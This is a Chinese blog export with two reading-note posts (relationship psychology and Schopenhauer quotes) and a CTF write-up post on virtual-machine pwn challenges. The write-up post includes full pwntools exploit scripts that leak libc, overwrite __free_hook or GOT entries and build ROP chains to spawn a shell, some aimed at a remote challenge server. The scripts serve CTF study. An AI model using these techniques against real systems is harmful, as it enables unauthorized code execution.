[{"categories":["reading"],"content":"\r摘录\rquote\r应警惕的观点：伴侣是不会发生改变的。一旦亲密关系变糟，就无法得到改善。如果爱人曾伤害过你，毫无疑问还会一而再，再而三地伤害你。\rquote\r持有成长信念的人还能心平气和地讨论爱人的缺点；相形之下，持有宿命信念的人一谈到伴侣的缺陷就充满敌意\rquote\r人们究竟要怎样才能与爱恋自己的人快乐相处呢？1.建立对伴侣善意和大度的认知，突出他们的美德而缩小他们的缺陷 2.随着对伴侣了解程度的增加，不断调整自己对理想伴侣的期望\rquote\r对他人的期望能引导我们对他人做出的行为反应，所以期望具有促动作用\rquote\r找到你生命中的真爱并不能让你永远幸福。\rquote\r自主(autonomy)：允许你的伴侣在亲密关系之外还能拥有自己的朋友和兴趣爱好；不要有太强的占有欲。(37%) 相似(similarity)：你和伴侣应该有相似的态度、价值观和兴趣；差别不要太大。(30%) 支持(supportiveness)：提升伴侣的自我价值和自尊；不要粗枝大叶或不够体贴。(27%) 开放(openness)：真诚而又真实地进行自我表露；不要什么都不说。(22%) 忠诚(fidelity)：对你的伴侣保持忠诚；不要出轨。(17%) 共处(togetherness)：一起分享大量的时间；尽量不要上夜班或搬到外地，不要在其他地方花太多时间。(16%) 公平(equity)：秉持公正与公平；不要利用和剥削你的伴侣。(12%) 魔力(magic)：保持浪漫；拒绝平淡。(10%) quote\r翻来覆去的反刍思维(rumination)只会延长我们的痛苦，而反省（即找寻经历中的意义并期望从中学习）则与积极的调适和恢复有关(Saffrey \u0026 Ehrenberg, 2007)\rquote\r为了忘掉前任，他们可以着手浏览约会网站，看看那里都有些什么样的人；焦虑的人把目光投向新朋友，反倒更容易从失败的亲密关系中走出来(Spielmann et al., 2009)。但是，任何人都不应该再去浏览前任的社交网络上的主页；人们用于查看前任主页上的时间越多，其感情创伤愈合并开始新生活所需的时间就越长\rquote\r与那些父母仍维持婚姻的孩子相比，父母离异的孩子在青少年期和成年早期的幸福感都较低。他们的心理适应能力相对低下，体验到更多的抑郁和焦虑，对生活的满意度较低。他们的问题行为更多，如吸毒、违法、少女怀孕、学业不良等问题更为严重。\rquote\r如果孩子生活在持续发生冲突的家庭，父母不离婚则会使他们的情况更糟糕\rquote\r当和平的婚姻破裂时，孩子就会受到伤害；如果家庭充满冲突，则离婚倒会让孩子的境况变得更好\rquote\r如果子女能够免于贫困，得到充满关爱的、可靠的和一致的养育，并远离父母冲突带来的伤害，他们就能快乐地成长\rquote\r人们通常期望男性具有果断自信、自强自立而非温情脉脉、温柔体贴的行为风格，而这种行为风格并不能将他们培养成长期亲密关系中非常理想的伴侣\rquote\r临近、熟识和方便是决定具有奖赏价值的亲密关系能否开始的重要因素。可能我们与许多人都能建立美满的亲密关系，只不过我们与他们永远不会相遇\rquote\r我们并不像自己以为的那样了解或理解自己的伴侣；即使在成功的亲密关系中，仍存在很多误解\rquote\r从长远来看，亲密关系的代价往往比我们预期的要大得多。如果你认为你的亲密关系将带给你源源不断的幸福和喜悦，你肯定会失望\rquote\r约三分之一的人不能轻松舒适地对待相互依赖的亲密感；他们要么担心伴侣不够爱自己，要么在伴侣太亲近时感觉不自在\rquote\r幸福的恋人宽容地看待自己的伴侣及其行为，在有疑问时选择相信伴侣，即使伴侣偶尔行为不当，也仍然认为他们是善良体贴的\rquote\r在幸福的亲密关系中，当激情减退时，取而代之的是一种深厚、饱含感情的友谊，这种友谊对身处其中的人来说丰富、温暖且令人满意。\rquote\r也许最重要的是，如果我们努力，几乎所有人都能成为更体贴、更有魅力、更有价值的伴侣。当男性有动力进行非言语沟通时，他们会在这方面做得更好。如果我们能花时间检查自己理解的准确性，就能减少或消除言语上的误解。只要用心去做，我们就可以在对待伴侣时更礼貌、更无私、更体贴、更少挑剔。\rquote\r对一段伴侣关系做出承诺、希望并期望这段关系继续下去的人，其思维和行为方式都不同于承诺较少的伴侣(Ogolsky \u0026 Bowers, 2013)。当他们预见到与伴侣未来的幸福生活时(Lemay, 2016)，他们会以有助于维系伴侣关系的方式看待自己、伴侣及双方关系，并且以能够避免或化解冲突、充实亲密关系的方式行事。\r","date":"2025-10-23","objectID":"/posts/read_qmgx/:1:0","series":null,"tags":null,"title":"【阅读】亲密关系","uri":"/posts/read_qmgx/#摘录"},{"categories":["reading"],"content":"\r摘录\rquote\r我们不应为某件事情过分高兴或者过分悲伤，原因之一就是一切事物都在改变，另一个原因是我们对于何为有利、何为不利的判断是虚幻的\rquote\r我们幸福的原因存在于我们的自身之内，而不是自身之外\rquote\r人的内心快乐抑或内心痛苦首先就是人的感情、意欲和思想的产物。而人自身之外的所有事物，对于人的幸福都只是间接地发挥影响\rquote\r我们唯一能够做到的就是尽可能充分地利用我们既定的个性。因此，我们应该循着符合我们个性的方向，努力争取适合个性的发展，除此之外则一概避免。所以，我们必须选择与我们个性相配的地位、职业和生活方式\rquote\r一个人的个性及其价值，才唯一直接与他的幸福有关\rquote\r保持身体健康的手段无非就是避免一切纵欲放荡的行为、令人不快和剧烈的情绪动荡，以及长时间紧张的精神劳累；每天至少在户外进行两个小时的身体快速运动；勤洗冷水浴，饮食有节\rquote\r一个人自身拥有越丰富，他对身外之物的需求也就越少，别人对他来说就越不重要\rquote\r为了外在的荣耀、地位、头衔和名声而部分或全部奉献出自己的内在安宁、闲暇和独立——这是极度的愚蠢行为\rquote\r缺乏痛苦的程度是衡量一个人生活是否幸福的标准\rquote\r认清幸福是避免痛苦，而不是寻求快乐：我们不应该以痛苦为代价去购买快乐，甚至只是冒着遭受痛苦的风险去这样做也不行，否则，我们就会为了那些否定、因而是虚幻的东西而付出了肯定和实在的东西。但如果我们牺牲欢娱以避免痛苦，那我们肯定获得收益\rquote\r降低对幸福的期待： 我们对于幸福的过分期待毁坏了这世上的一切，毁坏的程度与我们做梦的程度相一致。谁要是摆脱了过分的期待，除了自己已经拥有的以外，不再奢望更多，那么，他就能够安然无恙地生活下去”（《梅克通信录》）\rquote\r如果你失去一个世界， 不要为此悲伤，因为这是微不足道的； 如果得到一个世界， 不要为此高兴，因为这是微不足道的； 苦乐得失都会过去 都会离开这个世界，因为这都是微不足道的。 ——安瓦里：《苏哈里》\rquote\r人生智慧的重要一点就是在关注现在和计划将来这两者之间达致恰到好处的平衡，这样，现在与将来才不至于互相干扰\rquote\r不要由于在过去我们的希望落空现在就变得忧郁寡欢，或者为了将来操心伤神以致败坏现时\rquote\r我们应该时刻记住：此刻时光匆匆消逝化作神奇的往昔，从此以后，它就存留在我们的记忆里，照射出不朽之光芒。在将来，尤其到了糟糕恶劣的日子，我们的记忆就会拉起帷幕：此刻时光就会成为我们内心眷恋和思念的对象。\rquote\r如果不跟别人作比较，那我们就会为我们所得到的感到快乐；如果由于别人比我们更加幸运而内心不安，那我们将永远不会快乐\rquote\r对于一切涉及痛苦和快乐的事情，我们应该把牢想象力的闸门\rquote\r通常，为了使现时灰暗的生活生色明快，我们盘算着种种美妙的可能，凭空想象出形形色色的诱人的希望，而所有这些都孕育着失望。\rquote\r正如流通的是纸钞，而不是真金白银，同样，在这个世界上，流行的不是发自内心的尊重和真正的友谊，而只是做得尽量逼真和自然地显示尊重和友谊的表面工夫\rquote\r“唯一能够取悦别人的方式就是把自己裹以最傻呆的动物的外皮。”显示自己的聪明智慧其实就是间接地指责别人愚蠢和无能\rquote\r一个明智的人其实就是一个不会被事物恒久不变的表面所欺骗的人，他甚至预见到了事情即将往哪一方向变化\rquote\r帮助我们以镇定自若的态度接受发生在我们身上的不幸和灾祸的最佳方法，莫过于确信这一真理：“发生的所有大大小小的事情，都是必然地发生。”\rquote\r所有的事物作为客体，亦即纯粹作为表象而存在时，毫无例外都是令人愉快的；但当这些事物作为主体存在，亦即存在于意欲之中时，却都沉浸在痛苦和悲哀之中\rquote\r一切事物在被观照时都是愉悦的，但在具体存在时，却是可怕的\rquote\r那些画像之所以具有如此的魅力，正是因为这些纯粹只是画像而已，它们并不是真实的\rquote\r人生经验的首要任务，就是要摆脱那些在我们青春期扎根头脑的幻想和虚假概念\r","date":"2025-10-23","objectID":"/posts/read_rsdzh/:1:0","series":null,"tags":null,"title":"【阅读】人生的智慧","uri":"/posts/read_rsdzh/#摘录"},{"categories":["pwn"],"content":"\r[OGeek2019 Final]OVMbuuctf的一道题 docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412 先输入pc、sp、code size pc：将指令写入memory的偏移，置0就行 sp：push、pop指令写入栈的偏移，置0就行 code size：增加一条opcode，opcode size就要加1 vm指令： 0x10：mov reg[high]，low 0x20：mov reg[high]，0 0x30：mov reg[high]，memory[reg[low]] 0x40：mov memory[reg[low]]，reg[high] 0x50：PUSH：push reg[high] ，sp++ 0x60：POP： pop[high]，sp– 0x70：ADD： reg[high] = reg[low] + reg[medium] 0x80：SUB：reg[high] = reg[medium] - reg[low] 0x90：AND： reg[high] = reg[low] \u0026 reg[medium] 0xa0：OR：reg[high] = reg[low] | reg[medium] 0xb0：XOR：reg[high] = reg[low] ^ reg[medium] 0xc0：SHL：reg[high] = reg[medium] « reg[low] 0xd0：SHR：reg[high] = reg[medium] » reg[low] 0xe0：EXIT：停止执行 ","date":"2025-10-23","objectID":"/posts/vmpwn/:1:0","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#ogeek2019-finalovm"},{"categories":["pwn"],"content":"\r思路可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入b'/bin/sh\\x00'+p64(sys_addr),这样free(comment)，就是system(\"/bin/sh\") ","date":"2025-10-23","objectID":"/posts/vmpwn/:1:1","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#思路"},{"categories":["pwn"],"content":"\rexp（拿了别的师傅的exp） from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" sbase 0x202060 sbase 0x202460 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"node5.buuoj.cn\",29198 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() #def opcode(op,high,medium,low): # pl = (op \u003c\u003c 24) + (high \u003c\u003c 16) + (medium \u003c\u003c 8) + (low) # print(\"---\u003e\",hex(pl)) # sl(str(pl)) #sla(b\"PC: \",str(0)) #sla(b\"SP: \",str(1)) #sla(b\"CODE SIZE: \",str(4)) #ru(b\"CODE: \") ##create a stderr address in reg array #opcode(0x10,0,0,26) #mov reg[0],26 #opcode(0x80,2,1,0) #reg[2]=reg[1]-reg[0] #opcode(0x30,4,0,2) #mov reg[4],memory[reg[2]] class VM: def __init__(self): self.instructions = [] def opcode(self, op, high, medium, low): self.instructions.append((op \u003c\u003c 24) | (high \u003c\u003c 16) | (medium \u003c\u003c 8) | low) def send_all(self): sla(b\"PC: \", \"0\") sla(b\"SP: \", \"0\") sla(b\"CODE SIZE: \", str(len(self.instructions))) ru(b\"CODE: \") for instr in self.instructions: sl(str(instr)) # - 0x10：mov reg[high]，low # - 0x20：mov reg[high]，0 # - 0x30：mov reg[high]，memory[reg[low]] # - 0x40：mov memory[reg[low]]，reg[high] # - 0x50：PUSH：push reg[high] ，sp++ # - 0x60：POP： pop[high]，sp-- # - 0x70：ADD： reg[high] = reg[low] + reg[medium] # - 0x80：SUB：reg[high] = reg[medium] - reg[low] # - 0x90：AND： reg[high] = reg[low] \u0026 reg[medium] # - 0xa0：OR：reg[high] = reg[low] | reg[medium] # - 0xb0：XOR：reg[high] = reg[low] ^ reg[medium] # - 0xc0：SHL：reg[high] = reg[medium] \u003c\u003c reg[low] # - 0xd0：SHR：reg[high] = reg[medium] \u003e\u003e reg[low] # - 0xe0：EXIT：停止执行 # 使用示例 vm = VM() #create a stderr address in reg array #负数偏移指向stderr vm.opcode(0x10, 0, 0, 26) #mov reg[0], 26 vm.opcode(0x80, 2, 1, 0) #reg[2] = reg[1]-reg[0] = FFFFFFE6 vm.opcode(0x30, 4, 0, 2) #mov reg[4],memory[reg[2]] vm.opcode(0x10,0,0,25) #mov reg[0],25 vm.opcode(0x80,2,1,0) #reg[2]=reg[1]-reg[0] vm.opcode(0x30,5,0,2) #mov reg[5],memory[reg[2]] reg[4][5]---\u003estderr address # create free_hook address through stderr address # stderr + 0x10a0 = free_hook - 0x8 vm.opcode(0x10,2,0,0x10) #mov reg[2],0x10 vm.opcode(0x10,0,0,8) #mov reg[0],8 vm.opcode(0xc0,1,2,0) #reg[1]=sal reg[2],8 vm.opcode(0x10,2,0,0xa0) #mov reg[2],0xa0 vm.opcode(0x70,1,1,2) #add reg[1],reg[2] vm.opcode(0x70,4,4,1) #add reg[4],reg[1] reg[4][5]---\u003efree_hook address-8 # let pointer comment point to free_hook vm.opcode(0x10,0,0,0x8) #mov reg[0],8 vm.opcode(0x80,2,7,0) #reg[2]=reg[7]-reg[0] = FFFFFFF8 vm.opcode(0x40,4,0,2) #mov memory[reg[2]],reg[4] vm.opcode(0x10,0,0,0x7) #mov reg[0],9 vm.opcode(0x80,2,7,0) #reg[2]=reg[7]-reg[0] vm.opcode(0x40,5,0,2) #mov memory[reg[2]],reg[5] vm.send_all() p.recvuntil(\"R4: \") addr1=int(p.recv(8),16) p.recvuntil(\"R5: \") addr2=int(p.recv(4),16) sys_addr=addr1+((addr2)\u003c\u003c32)-0x381410 lg(\"sys_addr\") # dbg() p.sendafter(\"HOW DO YO","date":"2025-10-23","objectID":"/posts/vmpwn/:1:2","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#exp"},{"categories":["pwn"],"content":"\rciscn_2019_qual_virtual先分配几个堆块 s = malloc(0x20u); // name data = alloc(0x40); text = alloc(0x80); stack = alloc(0x40); ptr = malloc(0x400u); 输入数据，将指令转成opcode，数据写入data puts(\"Your program name:\"); input(s, 32); puts(\"Your instruction:\"); input(ptr, 0x400); get_opcode_numnber(text, ptr); puts(\"Your stack data:\"); input(ptr, 0x400); get_data(data, ptr); 交互方式大致为： sla(b'name:\\n',b'j4f') sla(b'instruction:\\n',b'push push push add pop') sla(b'stack data:\\n',b'2 4 6') 指令： push: push数据，后push的在伪造stack的高地址 pop：stack高地址的数据，给data的低地址 add: stack两个高地址的数据相加，存在stack次高地址处 sub：stack两个高地址的数据相减(高地址减次高地址)，存在stack次高地址处 mul: stack两个高地址的数据相乘，存在stack次高地址处 div: stack两个高地址的数据相除，存在stack次高地址处 load: 往stack_data + flag + 偏移处，写入基于stack_data某偏移内容 load指令： 存数据到栈顶 // load __int64 __fastcall sub_401CCE(alloc_heap *stack, __int64 data) { __int64 v3; // [rsp+10h] [rbp-10h] BYREF if ( (unsigned int)give_v1_2_v2(stack, \u0026v3) ) //这里会把flag-1 return give_v2_2_V1(stack, *((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3)); //这里flag+1 else return 0; } 把*((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3))的值给栈顶 注意flag - 1 save指令： 写数据到*((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3)中 // save __int64 __fastcall sub_401D37(alloc_heap *stack, __int64 data) { __int64 v3; // [rsp+10h] [rbp-10h] BYREF __int64 v4; // [rsp+18h] [rbp-8h] BYREF if ( !(unsigned int)give_v1_2_v2(stack, \u0026v3) || !(unsigned int)give_v1_2_v2(stack, \u0026v4) ) //注意这里会把flag -2 return 0; *((_QWORD *)stack-\u003edata_ptr + stack-\u003eflag + v3) = v4; return 1; } 先push的是v4 注意flag -2 execute完之后，会puts(s);，这里把puts_got改成system，s写入/bin/sh ","date":"2025-10-23","objectID":"/posts/vmpwn/:2:0","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#ciscn_2019_qual_virtual"},{"categories":["pwn"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" b *0x401332 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"node5.buuoj.cn\",29332 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): # gdb.attach(p) gdb.attach(p, gdbscript=gdbscript) # pause() # data 0x200 # text 0x400 # stack 0x200 # instruction 0x400 p.sendlineafter(\"Your program name:\\n\",\"/bin/sh\\x00\") p.sendlineafter(\"Your instruction:\\n\",\"push push save push load push add push save\") p.sendlineafter(\"Your stack data:\\n\",\"4210896 -3 -21 -172800 -21\") itr() ","date":"2025-10-23","objectID":"/posts/vmpwn/:2:1","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#exp-1"},{"categories":["pwn"],"content":"\r长城杯pwn—avm文章及附件：https://bbs.kanxue.com/thread-284826.htm 这里我直接拿我本地的libc做了 vm结构体 struct vm_struct { _QWORD reg[32]; _QWORD rip; _QWORD opcode; _QWORD num; }; 交互： 一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high def op(opcode,high,medium,low): ope = p32(opcode\u003c\u003c28 | (high\u00260x1f)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (low\u00260x1f)) return ope def add(high,medium,low): ret op(1,high,medium,low) def load(offset,medium,src,opcode=9): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (src\u00260x1f)) return ope def store(offset,medium,dest,opcode=10): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (dest\u00260x1f)) return ope 指令: 4个字节一个指令 add: low = high + medium sub: low = medium - high mul: low = high*medium div: low = medium/high xor: low = high^medium and: low = high\u0026medium shl: low = medium\u003c\u003chigh shr: low = medium\u003e\u003ehigh load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处 这里low和medium不要是同一寄存器 unsigned __int64 __fastcall load(vm_struct *vm_struct, __int64 stack) { unsigned __int64 result; // rax unsigned int v3; // [rsp+20h] [rbp-20h] _QWORD *v4; // [rsp+30h] [rbp-10h] v3 = *(_DWORD *)(vm_struct-\u003eopcode + (vm_struct-\u003erip \u0026 0xFFFFFFFFFFFFFFFCLL)); vm_struct-\u003erip += 4LL; result = (unsigned __int8)byte_4010; // 0xff if ( (unsigned __int8)(vm_struct-\u003ereg[(v3 \u003e\u003e 5) \u0026 0x1F] + BYTE2(v3)) \u003c (unsigned __int8)byte_4010 ) { v4 = (_QWORD *)((unsigned __int16)(vm_struct-\u003ereg[(v3 \u003e\u003e 5) \u0026 0x1F] + (HIWORD(v3) \u0026 0xFFF)) + stack); *v4 = vm_struct-\u003ereg[v3 \u0026 0x1F]; return (unsigned __int64)v4; } return result; } store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器 vm_struct *__fastcall mov(vm_struct *vm_struct, __int64 a2) { vm_struct *vm_struct_1; // rax unsigned __int16 v3; // [rsp+1Eh] [rbp-22h] unsigned int v4; // [rsp+20h] [rbp-20h] v4 = *(_DWORD *)(vm_struct-\u003eopcode + (vm_struct-\u003erip \u0026 0xFFFFFFFFFFFFFFFCLL)); vm_struct-\u003erip += 4LL; vm_struct_1 = (vm_struct *)(unsigned __int8)byte_4010; if ( (unsigned __int8)(vm_struct-\u003ereg[(v4 \u003e\u003e 5) \u0026 0x1F] + BYTE2(v4)) \u003c (unsigned __int8)byte_4010 )// 0xff { vm_struct_1 = vm_struct; v3 = vm_struct-\u003ereg[(v4 \u003e\u003e 5) \u0026 0x1F] + (HIWORD(v4) \u0026 0xFFF); vm_struct-\u003ereg[v4 \u0026 0x1F] = ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 7) \u003c\u003c 56) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 6) \u003c\u003c 48) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 5) \u003c\u003c 40) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 4) \u003c\u003c 32) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 3) \u003c\u003c 24) | ((unsigned __int64)*(unsigned __int8 *)(v3 + a2 + 2) \u003c\u003c 16) | *(unsigned __int16 *)(v3 + a2); } return vm_struct_1; } ","date":"2025-10-23","objectID":"/posts/vmpwn/:3:0","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#长城杯pwn---avm"},{"categories":["pwn"],"content":"\r思路 把栈上的libc地址存在vm_struct的寄存器中 因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西 把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链 把rop链写入栈中返回地址处 ","date":"2025-10-23","objectID":"/posts/vmpwn/:3:1","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#思路-1"},{"categories":["pwn"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn1' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" # bbase 0x1b70 # bbase 0x1AFB #Unsupported instruction的leave;ret bbase 0x1aad c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): # gdb.attach(p) gdb.attach(p, gdbscript=gdbscript) # pause() def op(opcode,high,medium,low): ope = p32(opcode\u003c\u003c28 | (high\u00260x1f)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (low\u00260x1f)) return ope def add(high,medium,low): return op(1,high,medium,low) def sub(high,medium,low): return op(2,high,medium,low) def load(offset,medium,src,opcode=9): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (src\u00260x1f)) return ope def store(offset,medium,dest,opcode=10): ope = p32(opcode\u003c\u003c28 | (offset\u00260xfff)\u003c\u003c16 | (medium\u00260x1f)\u003c\u003c5 | (dest\u00260x1f)) return ope base_addr = 0x120+0x38 dest_offset = 0x118 #dest: # 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix+875) ◂— pop rdi #ret_addr: # 27:0138│+008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop opcode = store(0xd38,0,0) #libc地址给寄存器0 opcode+= store(base_addr,20,1) #system的偏移给寄存器1，20这里随便设置，不和low一样就行 opcode+= store(base_addr+8,20,2) #binsh的偏移给寄存器2 opcode+= store(base_addr+0x10,20,3) #ret的偏移给寄存器3 opcode+= store(base_addr+0x18,20,4) #pop_rdi_ret偏移给寄存器4 opcode+= add(0,1,5) #寄存器5=寄存器0+system偏移=system地址 opcode+= add(0,2,6) #寄存器6=寄存器0+binsh偏移=binsh地址 opcode+= sub(3,0,7) #寄存器7=寄存器0-ret偏移=ret地址 opcode+= add(0,4,8) #寄存器8=寄存器0+pop_rdi_ret偏移=pop_rdi_ret地址 opcode+= load(dest_offset,20,8) #pop_rdi_ret opcode+= load(dest_offset+8,20,6) #binsh opcode+= load(dest_offset+0x10,20,7) #ret opcode+= load(dest_offset+0x18,20,5) #system opcode+=p32(0) opcode+=p64(0x2e586) #system opcode+=p64(0x1a1265) #binsh opcode+=p64(0x199b) #ret opcode+=p64(0xe55c1) #pop_rdi_ret # dbg() sla(b'opcode: ',opcode) itr() # sbase 0x40c0 # 0x7fff2d02dd50 #main栈帧中存储opcode地址 # 0x7fff2d02dc30 #execute 中stack地址 #之间偏移为0x120 #system = 寄存器0 + 0x2e586 #binsh = 寄存器0 + 0x1a1265 #ret = 寄存器0 - 0x199b #pop_rdi_ret = 寄存器0 + 0xe55c1 # pwndbg\u003e sbase 0x40c0 # 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main+122) ◂— mov edi, eax # 01:0008│ 0x6127080540c8 ◂— 0 # 02:0010│ 0x6127080540d0 ◂— 0 # 03:0018│ 0x6127080540d8 ◂— 0 # 04:0020│ 0x6127080540e0 ◂— 0 # 05:0028│ 0x6127080540e8 ◂— 0 # 06:0030│ 0x6127080540f0 ◂— 0 # 07:0038│ 0x6127080540f8 ◂— 0 # 08:0040│ 0x612708054100 ◂— 0 # 09:0048│ 0x612708054108 ◂— 0 # pwndbg\u003e p \u0026system # $1 = (int (*)(const char *)) 0x759f7fe58750 \u003c__libc_system\u003e # pwndbg\u003e search \"/bin/sh\" # Searching for byte: b'/bin/sh' # libc.so.6 0x759f7ffcb42f 0x68732f6e69622f /* '/bin/sh' */ # pwndbg\u003e p/x 0x759f7fe58750 - 0x759f7fe2a1ca # $2 = 0x2e586 # pwndbg\u003e p/x 0x759f7ffcb42f - 0x759f7fe2a1ca # $3 = 0x1a1265 #ret指令 # 0x000000000002882f : ret # pwndbg\u003e p/x 0x759f7fe2a1ca - 0x759f7fe","date":"2025-10-23","objectID":"/posts/vmpwn/:3:2","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#exp-2"},{"categories":["pwn"],"content":"\r2020网鼎杯青龙组-boom1https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba\u0026u_asig=1a0c381017440330108046584e0135 编译器类vmpwn 大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。 malloc(0x40000u);会走mmap，申请的变量和libc的偏移是固定的 我们可以定义一个变量，从这个变量的地址寻址到__free_hook和system函数，将后者覆写到前者，再调用free('/bin/sh')即可。 ","date":"2025-10-23","objectID":"/posts/vmpwn/:4:0","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#2020网鼎杯青龙组-boom1"},{"categories":["pwn"],"content":"\r0CTF/TCTF 2022 ezvm别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm 指令梳理： 0 push: 把memory的数据压入栈中 1 pop: 栈中数据弹出到memory 2-12 ： 对栈中数据进行加减乘除等操作，并把sp-1 13 : 判断栈顶是否为0 14-16： jmp jz jnz 17-19: 比较指令 20 mov: 写8字节到bss段（类似寄存器） 21 store:指定寄存器中数据写入到memory区域 22 load:把memory中的数据写入到指定寄存器 交互： push = lambda bss :p8(0)+p8(bss) #压入寄存器的内容到栈 and_f = lambda :p8(9) nz = lambda add_ip 